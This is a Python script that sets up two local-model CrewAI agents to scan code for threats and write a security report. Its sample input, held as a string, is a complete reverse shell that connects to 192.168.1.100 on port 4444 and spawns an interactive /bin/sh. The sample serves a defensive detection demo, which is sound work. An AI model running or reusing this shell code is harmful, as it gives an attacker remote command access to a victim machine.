import os
from crewai import Agent, Crew, Process, Task
from langchain_openai import ChatOpenAI

# Setting up local Small Language Models (SLMs) via Ollama
code_scanner_llm = ChatOpenAI(
    model="llama3:8b", 
    base_url="http://localhost:11434/v1",
    api_key="ollama"
)

report_writer_llm = ChatOpenAI(
    model="phi3:mini", 
    base_url="http://localhost:11434/v1",
    api_key="ollama"
)

# Agent 1: The Code Auditor that scans for security threats
auditor_agent = Agent(
    role="Cybersecurity Static Code Auditor",
    goal="Scan the provided script to identify suspicious patterns, hidden backdoors, or malicious functions.",
    backstory="You are an expert in reverse engineering and malware analysis. You catch malicious code injection instantly.",
    llm=code_scanner_llm,
    verbose=True
)

# Agent 2: The Security Reporter
reporter_agent = Agent(
    role="Cybersecurity Incident Reporter",
    goal="Take the detected security risks and write a professional executive vulnerability report.",
    backstory="You are a senior security consultant. You explain technical vulnerabilities in simple, actionable terms for managers.",
    llm=report_writer_llm,
    verbose=True
)

# Sample of a highly suspicious script that acts like a backdoor
suspicious_code = """
import os
import socket
import subprocess

def connect_back():
    REMOTE_HOST = "192.168.1.100"
    REMOTE_PORT = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((REMOTE_HOST, REMOTE_PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
"""

# Defining tasks for security assessment
task_scan = Task(
    description=f"Analyze this specific script for potential cybersecurity threats and dangerous operations: {suspicious_code}",
    expected_output="A structured list of found vulnerabilities, severe threats, and suspicious network activities.",
    agent=auditor_agent
)

task_report = Task(
    description="Based on the vulnerabilities found, generate a professional Security Assessment Report with a Risk Score (Low/Medium/High).",
    expected_output="A clean Markdown security report detailing the threat, its impact, and recommended fixes.",
    agent=reporter_agent
)

# Bundling the agents together
security_crew = Crew(
    agents=[auditor_agent, reporter_agent],
    tasks=[task_scan, task_report],
    process=Process.sequential
)

if __name__ == "__main__":
    print("Initiating local automated security analysis...")
    security_report = security_crew.kickoff()
    print("\n=== FINAL SECURITY REPORT ===\n")
    print(security_report)
